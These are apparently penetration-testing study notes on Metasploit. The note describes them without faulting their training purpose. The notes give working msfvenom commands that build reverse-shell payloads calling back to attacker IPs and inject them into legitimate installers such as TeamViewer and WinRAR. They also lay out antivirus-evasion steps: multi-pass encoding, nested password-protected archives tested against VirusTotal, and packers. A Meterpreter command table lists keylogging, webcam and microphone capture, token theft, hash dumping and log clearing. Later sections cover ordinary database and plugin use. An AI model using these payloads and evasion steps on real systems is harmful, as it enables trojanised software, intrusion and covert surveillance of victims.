```bash
# Generating Windows payload
msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -f exe > payload.exe

# Generating Linux payload
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf

# List all the available payloads
msfvenom -l payloads
msf6 > show payloads
```
# Meterpreter Commands 

| **Core Commands**                                     | **Description**                                                                               |
| ----------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| `background`                                          | Run your current Meterpreter shell in the background.                                         |
| `exit`                                                | Terminate the Meterpreter session                                                             |
| `guid`                                                | Get the session GUID (Globally Unique ID)                                                     |
| `help`                                                | Open Meterpreter usage help.                                                                  |
| `info`                                                | Display information about a post module                                                       |
| `irb`                                                 | Opens an interactive Ruby shell on the current session                                        |
| `load`                                                | Loads one or more Meterpreter extensions                                                      |
| `migrate <proc. id>`                                  | Migrate to the specific process ID (PID is the target process ID gained from the ps command). |
| `run`                                                 | Executes a Meterpreter script or Post module                                                  |
| `sessions`                                            | Quickly switch to another session                                                             |
| **File System Commands**                              | **Description**                                                                               |
| `cd`                                                  | Will change directory                                                                         |
| `ls`                                                  | List the files and folders on the target.                                                     |
| `pwd`                                                 | Prints the current directory                                                                  |
| `edit`                                                | Will allow you to edit a file                                                                 |
| `cat`                                                 | Will show the contents of a file                                                              |
| `rm`                                                  | Will delete the specified file                                                                |
| `search`                                              | Will search for files                                                                         |
| `upload`                                              | Will upload a file or directory                                                               |
| `download`                                            | Will download a file or directory                                                             |
| **Networking Commands**                               | **Description**                                                                               |
| `arp`                                                 | Displays the host ARP cache                                                                   |
| `ipconfig`                                            | Displays network interfaces available on the target system                                    |
| `ifconfig`                                            | Displays network interfaces available on the target system                                    |
| `netstat`                                             | Displays the network connections                                                              |
| `portfwd`                                             | Forwards a local port to a remote service                                                     |
| `resolve`                                             | Resolve a set of hostnames on the target                                                      |
| `route`                                               | Allows you to view and modify the routing table                                               |
| `sniffer_interfaces`                                  | List the available interfaces on the target.                                                  |
| `sniffer_dump <interfaceID> pcapname`                 | Start sniffing on the remote target.                                                          |
| `sniffer_start <interfaceID> packet-buffer`           | Start sniffing with a specific range for a packet buffer.                                     |
| `sniffer_stats <interfaceID>`                         | Grab statistical information from the interface you are sniffing.                             |
| `sniffer_stop <interfaceID>`                          | Stop the sniffer.                                                                             |
| **System Commands**                                   | **Description**                                                                               |
| `sysinfo`                                             | Show the system information on the compromised target.                                        |
| `clearev`                                             | Clear the event log on the target machine.                                                    |
| `getpid`                                              | Shows the current process ID                                                                  |
| `execute -f <cmd.exe> -i`                             | Execute cmd.exe and interact with it.                                                         |
| `execute -f <cmd.exe> -i -t`                          | Execute cmd.exe with all available tokens.                                                    |
| `execute -f <cmd.exe> -i -H -t`                       | Execute cmd.exe with all available tokens and make it a hidden process.                       |
| `getuid`                                              | Shows the user that Meterpreter is running as                                                 |
| `kill`                                                | Terminates a process                                                                          |
| `pkill`                                               | Terminates a process by name                                                                  |
| `ps`                                                  | Show all running processes and which accounts are associated with each process.               |
| `list_tokens -u`                                      | List available tokens on the target by user.                                                  |
| `list_tokens -g`                                      | List available tokens on the target by group.                                                 |
| `add_user <username> <password> -h <ip>`              | Add a user on the remote target.                                                              |
| `add_group_user <"Domain Admins"> <username> -h <ip>` | Add a username to the Domain Administrators group on the remote target.                       |
| `shell`                                               | Drop into an interactive shell with all available tokens.                                     |
| `reboot`                                              | Reboot the target machine.                                                                    |
| `shutdown`                                            | Shuts down the remote computer                                                                |
| **Others Commands**                                   | **Description**                                                                               |
| `getprivs`                                            | Get as many privileges as possible on the target.                                             |
| `getsystem`                                           | Attempt to elevate permissions to SYSTEM-level access through multiple attack vectors.        |
| `use priv`                                            | Load the privilege extension for extended Meterpreter libraries.                              |
| `use incognito`                                       | Load incognito functions. (Used for token stealing and impersonation on a target machine.)    |
| `impersonate_token <DOMAIN_NAMEUSERNAME>`             | Impersonate a token available on the target.                                                  |
| `steal_token <proc. id>`                              | Steal the tokens available for a given process and impersonate that token.                    |
| `drop_token`                                          | Stop impersonating the current token.                                                         |
| `idletime`                                            | Returns the number of seconds the remote user has been idle                                   |
| `keyscan_dump`                                        | Dump the remote keys captured on the target.                                                  |
| `keyscan_start`                                       | Start sniffing keystrokes on the remote target.                                               |
| `keyscan_stop`                                        | Stop sniffing keystrokes on the remote target.                                                |
| `uictl enable <keyboard/mouse>`                       | Take control of the keyboard and/or mouse.                                                    |
| `screenshot`                                          | Take a screenshot of the target’s screen.                                                     |
| `screenshare`                                         | Allows you to watch the remote user’s desktop in real time                                    |
| `setdesktop <number>`                                 | Switch to a different screen based on who is logged in.                                       |
| `record_mic`                                          | Records audio from the default microphone for X seconds                                       |
| `webcam_chat`                                         | Starts a video chat                                                                           |
| `webcam_list`                                         | Lists webcams                                                                                 |
| `webcam_snap`                                         | Takes a snapshot from the specified webcam                                                    |
| `webcam_stream`                                       | Plays a video stream from the specified webcam                                                |
| `timestomp`                                           | Change file attributes, such as creation date (antiforensics measure).                        |
| `hashdump`                                            | Dump all hashes on the target. use sniffer Load the sniffer module.                           |
| `reg <command>`                                       | Interact, create, delete, query, set, and much more in the target’s registry.                 |
| `rev2self`                                            | Revert back to the original user you used to compromise the target.                           |
List of known payloads :

| **Payload**                       | **Description**                                                        |
| --------------------------------- | ---------------------------------------------------------------------- |
| `generic/custom`                  | Generic listener, multi-use                                            |
| `generic/shell_bind_tcp`          | Generic listener, multi-use, normal shell, TCP connection binding      |
| `generic/shell_reverse_tcp`       | Generic listener, multi-use, normal shell, reverse TCP connection      |
| `windows/x64/exec`                | Executes an arbitrary command (Windows x64)                            |
| `windows/x64/loadlibrary`         | Loads an arbitrary x64 library path                                    |
| `windows/x64/messagebox`          | Spawns a dialog via MessageBox using a customizable title, text & icon |
| `windows/x64/shell_reverse_tcp`   | Normal shell, single payload, reverse TCP connection                   |
| `windows/x64/shell/reverse_tcp`   | Normal shell, stager + stage, reverse TCP connection                   |
| `windows/x64/shell/bind_ipv6_tcp` | Normal shell, stager + stage, IPv6 Bind TCP stager                     |
| `windows/x64/meterpreter/$`       | Meterpreter payload + varieties above                                  |
| `windows/x64/powershell/$`        | Interactive PowerShell sessions + varieties above                      |
| `windows/x64/vncinject/$`         | VNC Server (Reflective Injection) + varieties above                    |

# Injecting Payloads Into Windows Portable Executables
Let’s says we have the winrar binary `winrar.exe` we’ve just download.
```bash
# Use -x to inject a payload into executable
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.4 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f elf -x ~/Downloads/winrar.exe > ./winrarInfected.exe
```
# Encoding Payloads
```bash
# List different encoders
msfvenom --list encoders

# Use the -e option to specify the encoder option
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.4 LPORT=1234 -e x86/shikata_ga_nai -f exe > ./encodedx86.exe
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\\x00" -f perl -e x86/shikata_ga_nai
```
Suppose we want to select an Encoder for an `existing payload`. Then, we can use the `show encoders` command within the `msfconsole` to see which encoders are available for our current `Exploit module + Payload` combination :
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```
If we were to encode an executable payload only once with `Shikata_ga_nai`, it would most likely be detected by most antiviruses today. One better option would be to try running it through multiple iterations of the same Encoding scheme using `-i` option :
```bash
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```
But as we can see, it is still not enough for AV evasion. There is a high number of products that still detect the payload.
## Evasion Techniques
Most host-based anti-virus software nowadays relies mainly on `Signature-based Detection` to identify aspects of malicious code present in a software sample. We are in luck because `msfvenom` offers the option of using executable templates. This allows us to use some pre-set templates for executable files, inject our payload into them (no pun intended), and use `any` executable as a platform from which we can launch our attack. We can embed the shellcode into any installer, package, or program that we have at hand, hiding the payload shellcode deep within the legitimate code of the actual product. This greatly obfuscates our malicious code and, more importantly, lowers our detection chances.

Take a look at the snippet below to understand how msfvenom can embed payloads into any executable file:
```bash
Bailly@htb[/htb]$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5

Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/Desktop/TeamViewer_Setup.exe
```
For the most part, when a target launches a backdoored executable, nothing will appear to happen, which can raise suspicions in some cases. To improve our chances, we need to trigger the continuation of the normal execution of the launched application while pulling the payload in a separate thread from the main application. We do so with the `-k` flag as it appears above. However, even with the `-k` flag running, the target will only notice the running backdoor if they launch the backdoored executable template from a CLI environment. If they do so, a separate window will pop up with the payload, which will not close until we finish running the payload session interaction on the target.

We can then use `Archives`; Archiving a piece of information such as a file, folder, script, executable, picture, or document and placing a password on the archive bypasses a lot of common anti-virus signatures today. However, the downside of this process is that they will be raised as notifications in the AV alarm dashboard as being unable to be scanned due to being locked with a password. An administrator can choose to manually inspect these archives to determine if they are malicious or not.
```bash
# Generate an encoded payload
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

```bash
cat test.js

�+n"����t$�G4ɱ1zz��j�V6����ic��o�Bs>��Z*�����9vt��%��1�
<...SNIP...>
�Qa*���޴��RW�%Š.\\�=;.l�T���XF���T��
```
If we check against VirusTotal to get a detection baseline from the payload we generated, the results will be the following :
```bash
msf-virustotal -k <API key> -f test.js 

[*] WARNING: When you upload or otherwise submit content, you give VirusTotal
[*] (and those we work with) a worldwide, royalty free, irrevocable and transferable
[*] licence to use, edit, host, store, reproduce, modify, create derivative works,
[*] communicate, publish, publicly perform, publicly display and distribute such
[*] content. To read the complete Terms of Service for VirusTotal, please go to the
[*] following link:
[*] <https://www.virustotal.com/en/about/terms-of-service/>
[*] 
[*] If you prefer your own API key, you may obtain one at VirusTotal.

[*] Enter 'Y' to acknowledge: Y

[*] Using API key: <API key>
[*] Please wait while I upload test.js...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 35e7687f0793dc3e048d557feeaf615a
[*] Sample SHA1 hash   : f2f1c4051d8e71df0741b40e4d91622c4fd27309
[*] Sample SHA256 hash : 08799c1b83de42ed43d86247ebb21cca95b100f6a45644e99b339422b7b44105
[*] Analysis link: <https://www.virustotal.com/gui/file/><SNIP>/detection/f-<SNIP>-1652167047
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Analysis Report: test.js (11 / 59): <...SNIP...>
```
We will be detected by 11 / 59 antivirus.
- Now, try archiving it two times, passwording both archives upon creation, and removing the `.rar`/`.zip`/`.7z` extension from their names. For this purpose, we can install the [RAR utility](https://www.rarlab.com/download.htm) from RARLabs, which works precisely like WinRAR on Windows.
```bash
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
rar a ~/test.rar -p ~/test.js

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test.rar
Adding    test.js                                                     OK 
Done
```

```bash
ls

test.js   test.rar
```
We can `remove the .RAR` extension :
```bash
mv test.rar test
ls

test   test.js
```
Archiving the Payload Again :
```bash
rar a test2.rar -p test

Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK 
Done
```
And `removing again the .RAR` extension :
```bash
mv test2.rar test2
ls

test   test2   test.js
```
The test2 file is the final .rar archive with the extension (.rar) deleted from the name. After that, we can proceed to upload it on VirusTotal for another check :
```bash
msf-virustotal -k <API key> -f test2

[*] Using API key: <API key>
[*] Please wait while I upload test2...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d
[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429
[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
[*] Analysis link: <https://www.virustotal.com/gui/file/><SNIP>/detection/f-<SNIP>-1652167804
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
=================================================================================================
```
As we can see from the above, this is an excellent way to transfer data both `to` and `from` the target host.
## Packers
The term `Packer` refers to the result of an `executable compression` process where the payload is packed together with an executable program and with the decompression code in one single file. When run, the decompression code returns the backdoored executable to its original state, allowing for yet another layer of protection against file scanning mechanisms on target hosts. This process takes place transparently for the compressed executable to be run the same way as the original executable while retaining all the original functionality. In addition, msfvenom provides the ability to compress and change the file structure of a backdoored executable and encrypt the underlying process structure. A list of popular packer software:

A list of popular packer software:

|[UPX packer](https://upx.github.io/)|[The Enigma Protector](https://enigmaprotector.com/)|[MPRESS](https://web.archive.org/web/20240310213323/https://www.matcode.com/mpress.htm)|
|Alternate EXE Packer|ExeStealth|Morphine|
|MEW|Themida||

If we want to learn more about packers, please check out the [PolyPack project](https://jon.oberheide.org/files/woot09-polypack.pdf).
## Exploit Coding
When coding our exploit or porting a pre-existing one over to the Framework, it is good to ensure that the exploit code is not easily identifiable by security measures implemented on the target system. For example, a typical `Buffer Overflow` exploit might be easily distinguished from regular traffic traveling over the network due to its hexadecimal buffer patterns. IDS / IPS placements can check the traffic towards the target machine and notice specific overused patterns for exploiting code.

When assembling our exploit code, randomization can help add some variation to those patterns, which will break the IPS / IDS database signatures for well-known exploit buffers. This can be done by inputting an `Offset` switch inside the code for the msfconsole module:
```ruby
# Ruby code
'Targets' =>
[
 	[ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```
Besides the BoF code, one should always avoid using obvious NOP sleds where the shellcode should land after the overflow is completed. Please note that the BoF code's purpose is to crash the service running on the target machine, while the NOP sled is the allocated memory where our shellcode (the payload) is inserted. IPS/IDS entities regularly check both of these, so it is good to test our custom exploit code against a sandbox environment before deploying it on the client network. Of course, we might only have one chance to do this correctly during an assessment.
## A Note on Evasion
This section covers evasion at a high level. Be on the lookout for later modules that will dig deeper into the theory and practical knowledge needed to perform evasion more effectively. It is worth trying some of these techniques out on older HTB machines or installing a VM with older versions of Windows Defender or free AV engines, and practicing evasion skills. This is a vast topic that cannot be covered adequately in a single section.



# Using Database
`Databases` in `msfconsole` are used to keep track of your results. `Msfconsole` has built-in support for the PostgreSQL database system. With it, we have direct, quick, and easy access to scan results with the added ability to import and export results in conjunction with third-party tools.
## Setting up the Database
We’ll first start the `PostgreSQL` service :
```bash
# Start PostgreSQL service
sudo systemctl start postgresql

# Create & initialize MSF db
sudo msfdb init

# Start msfconsole + connect to created db
sudo msfdb run
```
If, however, we already have the database configured and are not able to change the password to the MSF username, proceed with these commands :
```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q

msf6 > db_status

[*] Connected to msf. Connection type: PostgreSQL.
```
Now we’re good to go. We can have a look of the `MSF Database options` :
```bash
# Get the MSF database options
msf6 > help database

Database Backend Commands
=========================

    Command           Description
    -------           -----------
    db_connect        Connect to an existing database
    db_disconnect     Disconnect from the current database instance
    db_export         Export a file containing the contents of the database
    db_import         Import a scan result file (filetype will be auto-detected)
    db_nmap           Executes nmap and records the output automatically
    db_rebuild_cache  Rebuilds the database-stored module cache
    db_status         Show the current database status
    hosts             List all hosts in the database
    loot              List all loot in the database
    notes             List all notes in the database
    services          List all services in the database
    vulns             List all vulnerabilities in the database
    workspace         Switch between database workspaces
	

msf6 > db_status

[*] Connected to msf. Connection type: postgresql.
```
## Workspaces
We can think of `Workspaces` the same way we would think of folders in a project. We can segregate the different scan results, hosts, and extracted information by IP, subnet, network, or domain. We can view the current Workspace list using :
```bash
# View current workspace
msf6 > workspace

# Create workspace
workspace -a Target_1

# Switch & use the workspace
workspace Target_1

# Delete a workspace
workspace -d Target_1

# List workspace commands
workspace -h
```
## Importing Scan Results
We can import a `Nmap scan` of a host into our Database's Workspace using the `db_import` command. We need to use the `.xml` file type for `db_import`
```bash
cat Target.nmap

Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-17 20:54 UTC
Nmap scan report for 10.10.10.40
Host is up (0.017s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 60.81 seconds
```

```bash
msf6 > db_import Target.xml

[*] Importing 'Nmap XML' data
[*] Import: Parsing with 'Nokogiri v1.10.9'
[*] Importing host 10.10.10.40
[*] Successfully imported ~/Target.xml

msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.40             Unknown                    device         

msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```
- We can also use `Nmap Inside MSFconsole` using the `db_nmap` command.
```bash
msf6 > db_nmap -sV -sS 10.10.10.8

[*] Nmap: Starting Nmap 7.80 ( <https://nmap.org> ) at 2020-08-17 21:04 UTC
[*] Nmap: Nmap scan report for 10.10.10.8
[*] Nmap: Host is up (0.016s latency).
[*] Nmap: Not shown: 999 filtered ports
[*] Nmap: PORT   STATE SERVICE VERSION
[*] Nmap: 80/TCP open  http    HttpFileServer httpd 2.3
[*] Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> 
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 11.12 seconds

msf6 > hosts

Hosts
=====

address      mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------      ---  ----  -------  ---------  -----  -------  ----  --------
10.10.10.8              Unknown                    device         
10.10.10.40             Unknown                    device         

msf6 > services

Services
========

host         port   proto  name          state  info
----         ----   -----  ----          -----  ----
10.10.10.8   80     tcp    http          open   HttpFileServer httpd 2.3
10.10.10.40  135    tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  139    tcp    netbios-ssn   open   Microsoft Windows netbios-ssn
10.10.10.40  445    tcp    microsoft-ds  open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.10.40  49152  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49153  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49154  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49155  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49156  tcp    msrpc         open   Microsoft Windows RPC
10.10.10.40  49157  tcp    msrpc         open   Microsoft Windows RPC
```
## Data Backup
We can back up our data if anything happens with the PostgreSQL service, using the `db_export` command.
```bash
msf6 > db_export -h

Usage:
    db_export -f <format> [filename]
    Format can be one of: xml, pwdump
[-] No output file was specified

msf6 > db_export -f xml backup.xml

[*] Starting export of workspace default to backup.xml [ xml ]...
[*] Finished export of workspace default to backup.xml [ xml ]...
```
This data can be imported back to msfconsole later when needed.
## Hosts
The `hosts` command displays a database table automatically populated with the host addresses, hostnames, and other information we find about these during our scans and interactions.
```bash
msf6 > hosts -h

Usage: hosts [ options ] [addr1 addr2 ...]

OPTIONS:
  -a,--add          Add the hosts instead of searching
  -d,--delete       Delete the hosts instead of searching
  -c <col1,col2>    Only show the given columns (see list below)
  -C <col1,col2>    Only show the given columns until the next restart (see list below)
  -h,--help         Show this help information
  -u,--up           Only show hosts which are up
  -o <file>         Send output to a file in CSV format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -i,--info         Change the info of a host
  -n,--name         Change the name of a host
  -m,--comment      Change the comment of a host
  -t,--tag          Add or specify a tag to a range of hosts

Available columns: address, arch, comm, comments, created_at, cred_count, detected_arch, exploit_attempt_count, host_detail_count, info, mac, name, note_count, os_family, os_flavor, os_lang, os_name, os_sp, purpose, scope, service_count, state, updated_at, virtual_host, vuln_count, tags
```
## Services
The `services` command contains a table with descriptions and information on services discovered during scans or interactions.
```bash
msf6 > services -h

Usage: services [-h] [-u] [-a] [-r <proto>] [-p <port1,port2>] [-s <name1,name2>] [-o <filename>] [addr1 addr2 ...]

  -a,--add          Add the services instead of searching
  -d,--delete       Delete the services instead of searching
  -c <col1,col2>    Only show the given columns
  -h,--help         Show this help information
  -s <name>         Name of the service to add
  -p <port>         Search for a list of ports
  -r <protocol>     Protocol type of the service being added [tcp|udp]
  -u,--up           Only show services which are up
  -o <file>         Send output to a file in csv format
  -O <column>       Order rows by specified column number
  -R,--rhosts       Set RHOSTS from the results of the search
  -S,--search       Search string to filter by
  -U,--update       Update data for existing service

Available columns: created_at, info, name, port, proto, state, updated_at
```
## Credentials
The `creds` command allows you to visualize the credentials gathered during your interactions with the target host. We can also add credentials by ourself for the purpose of a scan for example
```bash
msf6 > creds -h

With no sub-command, list credentials. If an address range is
given, show only credentials with logins on hosts within that
range.

Usage - Listing credentials:
  creds [filter options] [address range]

Usage - Adding credentials:
  creds add uses the following named parameters.
    user      :  Public, usually a username
    password  :  Private, private_type Password.
    ntlm      :  Private, private_type NTLM Hash.
    Postgres  :  Private, private_type Postgres MD5
    ssh-key   :  Private, private_type SSH key, must be a file path.
    hash      :  Private, private_type Nonreplayable hash
    jtr       :  Private, private_type John the Ripper hash type.
    realm     :  Realm, 
    realm-type:  Realm, realm_type (domain db2db sid pgdb rsync wildcard), defaults to domain.

Examples: Adding
   # Add a user, password and realm
   creds add user:admin password:notpassword realm:workgroup
   # Add a user and password
   creds add user:guest password:'guest password'
   # Add a password
   creds add password:'password without username'
   # Add a user with an NTLMHash
   creds add user:admin ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   # Add a NTLMHash
   creds add ntlm:E2FC15074BF7751DD408E6B105741864:A1074A69B1BDE45403AB680504BBDD1A
   # Add a Postgres MD5
   creds add user:postgres postgres:md5be86a79bf2043622d58d5453c47d4860
   # Add a user with an SSH key
   creds add user:sshadmin ssh-key:/path/to/id_rsa
   # Add a user and a NonReplayableHash
   creds add user:other hash:d19c32489b870735b5f587d76b934283 jtr:md5
   # Add a NonReplayableHash
   creds add hash:d19c32489b870735b5f587d76b934283

General options
  -h,--help             Show this help information
  -o <file>             Send output to a file in csv/jtr (john the ripper) format.
                        If the file name ends in '.jtr', that format will be used.
                        If file name ends in '.hcat', the hashcat format will be used.
                        CSV by default.
  -d,--delete           Delete one or more credentials

Filter options for listing
  -P,--password <text>  List passwords that match this text
  -p,--port <portspec>  List creds with logins on services matching this port spec
  -s <svc names>        List creds matching comma-separated service names
  -u,--user <text>      List users that match this text
  -t,--type <type>      List creds that match the following types: password,ntlm,hash
  -O,--origins <IP>     List creds that match these origins
  -R,--rhosts           Set RHOSTS from the results of the search
  -v,--verbose          Don't truncate long password hashes

Examples, John the Ripper hash types:
  Operating Systems (starts with)
    Blowfish ($2a$)   : bf
    BSDi     (_)      : bsdi
    DES               : des,crypt
    MD5      ($1$)    : md5
    SHA256   ($5$)    : sha256,crypt
    SHA512   ($6$)    : sha512,crypt
  Databases
    MSSQL             : mssql
    MSSQL 2005        : mssql05
    MSSQL 2012/2014   : mssql12
    MySQL < 4.1       : mysql
    MySQL >= 4.1      : mysql-sha1
    Oracle            : des,oracle
    Oracle 11         : raw-sha1,oracle11
    Oracle 11 (H type): dynamic_1506
    Oracle 12c        : oracle12c
    Postgres          : postgres,raw-md5

Examples, listing:
  creds               # Default, returns all credentials
  creds 1.2.3.4/24    # Return credentials with logins in this range
  creds -O 1.2.3.4/24 # Return credentials with origins in this range
  creds -p 22-25,445  # nmap port specification
  creds -s ssh,smb    # All creds associated with a login on SSH or SMB services
  creds -t NTLM       # All NTLM creds
  creds -j md5        # All John the Ripper hash type MD5 creds

Example, deleting:
  # Delete all SMB credentials
  creds -d -s smb
```
## Loot
The `loot` command works in conjunction with the command above to offer you an at-a-glance list of owned services and users. The loot, in this case, refers to hash dumps from different system types, namely hashes, passwd, shadow, and more.
```bash
msf6 > loot -h

Usage: loot [options]
 Info: loot [-h] [addr1 addr2 ...] [-t <type1,type2>]
  Add: loot -f [fname] -i [info] -a [addr1 addr2 ...] -t [type]
  Del: loot -d [addr1 addr2 ...]

  -a,--add          Add loot to the list of addresses, instead of listing
  -d,--delete       Delete *all* loot matching host and type
  -f,--file         File with contents of the loot to add
  -i,--info         Info of the loot to add
  -t <type1,type2>  Search for a list of types
  -h,--help         Show this help information
  -S,--search       Search string to filter by
```



# Plugins
Plugins are readily available software that has already been released by third parties and have given approval to the creators of Metasploit to integrate their software inside the framework. These can represent commercial products that have a `Community Edition` for free use but with limited functionality, or they can be individual projects developed by individual people. All the plugins are located in `/usr/share/metasploit-framework/plugins`
```bash
# List all plugins
ls /usr/share/metasploit-framework/plugins

aggregator.rb      beholder.rb        event_tester.rb  komand.rb     msfd.rb    nexpose.rb   request.rb  session_notifier.rb  sounds.rb  token_adduser.rb  wmap.rb
alias.rb           db_credcollect.rb  ffautoregen.rb   lab.rb        msgrpc.rb  openvas.rb   rssfeed.rb  session_tagger.rb    sqlmap.rb  token_hunter.rb
auto_add_route.rb  db_tracker.rb      ips_filter.rb    libnotify.rb  nessus.rb  pcap_log.rb  sample.rb   socket_logger.rb     thread.rb  wiki.rb
```
If the plugin is found here, we can fire it up inside `msfconsole` using `load` command, and will be met with the greeting output for that specific plugin, signaling that it was successfully loaded in and is now ready to use :
```bash
msf6 > load nessus

[*] Nessus Bridge for Metasploit
[*] Type nessus_help for a command listing
[*] Successfully loaded Plugin: Nessus

msf6 > nessus_help

Command                     Help Text
-------                     ---------
Generic Commands            
-----------------           -----------------
nessus_connect              Connect to a Nessus server
nessus_logout               Logout from the Nessus server
nessus_login                Login into the connected Nessus server with a different username and 

<SNIP>

nessus_user_del             Delete a Nessus User
nessus_user_passwd          Change Nessus Users Password
                            
Policy Commands             
-----------------           -----------------
nessus_policy_list          List all polciies
nessus_policy_del           Delete a policy
```
## Install New Plugins
To install new custom plugins we can take the .rb file provided on the maker's page and place it in the folder at `/usr/share/metasploit-framework/plugins` with the proper permissions. For example, let us try installing [DarkOperator's Metasploit-Plugins](https://github.com/darkoperator/Metasploit-Plugins.git). Then, following the link above, we get a couple of Ruby (`.rb`) files which we can directly place in the folder mentioned above.
```bash
Bailly@htb[/htb]$ git clone <https://github.com/darkoperator/Metasploit-Plugins>
Bailly@htb[/htb]$ ls Metasploit-Plugins

aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb
alias.rb           komand.rb      pentest.rb           thread.rb
auto_add_route.rb  lab.rb         request.rb           token_adduser.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb
db_credcollect.rb  msfd.rb        sample.rb            twitt.rb
